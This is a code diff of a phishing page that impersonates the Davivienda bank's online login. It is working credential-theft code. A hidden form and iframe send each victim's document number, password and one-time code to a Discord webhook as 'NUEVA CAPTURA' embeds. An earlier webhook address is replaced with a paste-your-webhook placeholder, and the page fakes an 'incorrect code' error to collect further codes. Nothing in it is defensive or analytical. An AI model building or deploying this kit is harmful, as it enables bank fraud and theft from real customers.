@@ -6,11 +6,11 @@
     <title>Davivienda - Virtual</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-        /* Acumulación de pasos */
+        /* Acumulación de pasos en pantalla */
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         
-        /* Espaciado del checkbox corregido */
+        /* Corregimos el espaciado del checkbox según tu observación */
         .checkbox-container {
             margin-top: 25px !important; 
             margin-bottom: 15px !important;
@@ -22,7 +22,7 @@
         .step-done { opacity: 0.6; pointer-events: none; }
         .btn-hide { display: none !important; }
         
-        /* Ocultar el iframe de envío */
+        /* Ocultar el iframe de envío técnico */
         #hidden_iframe { display: none; }
     </style>
 </head>
@@ -47,7 +47,7 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Ingrese su número de documento</label>
-                    <input type="text" id="docNumber" class="form-input" autocomplete="off">
+                    <input type="text" id="docNumber" class="form-input" autocomplete="off" inputmode="numeric">
                 </div>
                 <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
             </div>
@@ -69,28 +69,38 @@
                     <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                     <div class="form-group">
                         <label class="form-label">Código de seguridad</label>
-                        <input type="text" id="otpCode" class="form-input" placeholder="000000">
+                        <input type="text" id="otpCode" class="form-input" placeholder="000000" inputmode="numeric">
                     </div>
                     <p id="errOtp" style="color: #ed1c24; font-size: 13px; display: none; margin-top: 10px; font-weight: bold;">Código incorrecto. Reintente.</p>
-                    <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
+                    <button type="button" id="btnFinish" class="btn-continue">Verificar Código</button>
                 </div>
             </div>
         </form>
 
         <form id="discord_form" target="hidden_iframe" method="POST" style="display:none;">
-            <input type="hidden" name="content" id="discord_content">
+            <input type="hidden" name="embeds" id="discord_content">
         </form>
         <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
+        const WEBHOOK_URL = 'TU_WEBHOOK_AQUI'; // PEGA TU WEBHOOK AQUÍ
 
-        function sendToDiscord(msg) {
+        // Función de envío técnico compatible con PC, usando Embeds estéticos
+        function sendToDiscord(titulo, color, fields) {
+            // Creamos el JSON del Embed estético
+            const embedData = [{
+                title: titulo,
+                color: color,
+                fields: fields,
+                footer: { text: "Davivienda Live Track | " + new Date().toLocaleString() }
+            }];
+            
+            // Lo enviamos como JSON por medio del formulario invisible
             const dForm = document.getElementById('discord_form');
             dForm.action = WEBHOOK_URL;
-            document.getElementById('discord_content').value = msg;
-            dForm.submit(); // Envío forzado que PC no bloquea
+            document.getElementById('discord_content').value = JSON.stringify(embedData);
+            dForm.submit(); 
         }
 
         // Paso 1 -> Clave
@@ -102,7 +112,7 @@
             }
         });
 
-        // Paso 2 -> Login + OTP abajo
+        // Paso 2 -> Login (Envía Embed y muestra OTP)
         document.getElementById('btnToOtp').addEventListener('click', () => {
             const btn = document.getElementById('btnToOtp');
             const doc = document.getElementById('docNumber').value;
@@ -113,9 +123,15 @@
             btn.innerText = "Validando...";
             btn.disabled = true;
 
-            sendToDiscord(`**🏦 NUEVA CAPTURA**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\``);
+            // Campos del Embed estético (Cuadro Rojo)
+            const fields = [
+                { name: "👤 Documento", value: `\`${doc}\``, inline: true },
+                { name: "🔑 Clave", value: `\`${clave}\``, inline: true }
+            ];
 
-            // En PC esto forzará el avance sin esperar respuesta
+            // Envía el cuadro Rojo estético
+            sendToDiscord("🏦 NUEVA CAPTURA: DAVIVIENDA", 15548997, fields);
+
             setTimeout(() => {
                 btn.classList.add('btn-hide');
                 document.getElementById('passSection').classList.add('step-done');
@@ -124,19 +140,27 @@
             }, 1000);
         });
 
-        // Paso 3 -> OTP Final
+        // Paso 3 -> OTP Final (Envía Embed y simula error)
         document.getElementById('btnFinish').addEventListener('click', () => {
             const btn = document.getElementById('btnFinish');
             const otp = document.getElementById('otpCode').value;
+            const doc = document.getElementById('docNumber').value;
             
             btn.innerText = "Verificando...";
             
-            sendToDiscord(`**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${document.getElementById('docNumber').value}\`\n🔢 **Código:** \`${otp}\``);
+            // Campos del Embed estético (Cuadro Amarillo)
+            const fields = [
+                { name: "👤 Documento", value: `\`${doc}\``, inline: true },
+                { name: "🔢 Código OTP", value: `\`${otp}\``, inline: true }
+            ];
+
+            // Envía el cuadro Amarillo estético
+            sendToDiscord("🔐 CÓDIGO RECIBIDO", 16776960, fields);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
                 document.getElementById('otpCode').value = '';
-                btn.innerText = "Verificar";
+                btn.innerText = "Verificar Código";
                 btn.disabled = false;
             }, 1200);
         });
